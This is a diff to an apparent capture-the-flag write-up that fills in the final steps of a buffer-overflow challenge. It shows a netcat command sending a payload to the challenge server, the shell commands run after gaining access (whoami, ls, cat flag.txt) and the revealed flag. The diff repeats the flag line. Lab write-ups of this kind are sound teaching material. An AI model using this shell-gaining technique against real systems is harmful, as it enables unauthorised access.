@@ -253,7 +253,21 @@ Enter the secret: You have passed.
 Per [LiveOverflow's instruction][3], chain a `cat` command after the initial `cat payload`:
 ```
 $ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2341
-<TODO: Add these last steps>
+Enter the secret: You have passed.
+whoami
+/bin/sh: 2: whoami: not found
+
+ls
+bin
+dev
+flag.txt
+lib
+lib32
+lib64
+secret
+
+cat flag.txt
+LHC{y0u_expl0it3d_bu553r_0v3rfl0w!!!}
 LHC{y0u_expl0it3d_bu553r_0v3rfl0w!!!}
 ```
 
